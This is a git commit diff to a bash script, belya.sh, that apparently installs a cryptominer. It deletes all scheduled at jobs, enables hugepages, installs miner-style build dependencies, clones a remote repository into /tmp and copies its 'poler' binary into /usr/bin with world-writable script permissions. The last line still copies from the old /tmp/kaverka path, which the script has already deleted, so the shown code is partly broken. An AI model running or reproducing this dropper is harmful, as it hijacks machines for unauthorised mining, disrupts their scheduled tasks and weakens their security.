fadb4220cfcf0077183458373a3ddc6da37d74e4
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-03-30 22:59:14 +0300

    general

--- belya.sh
+++ belya.sh
@@ -1,16 +1,16 @@
 #!/bin/bash
 
-rm -rf /tmp/kaverka/
+rm -rf /tmp/fckdapolice/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir kaverka
-git clone https://github.com/hay-bude/kaverka.git /tmp/kaverka
-cd /tmp/kaverka
-chmod +x /tmp/kaverka/poler
+cd /tmp && mkdir fckdapolice
+git clone https://github.com/getting-stronger/fckdapolice.git /tmp/fckdapolice
+cd /tmp/fckdapolice
+chmod +x /tmp/fckdapolice/poler
 chmod 777 ./*.sh
 cp /tmp/kaverka/poler /usr/bin/
 sleep 3
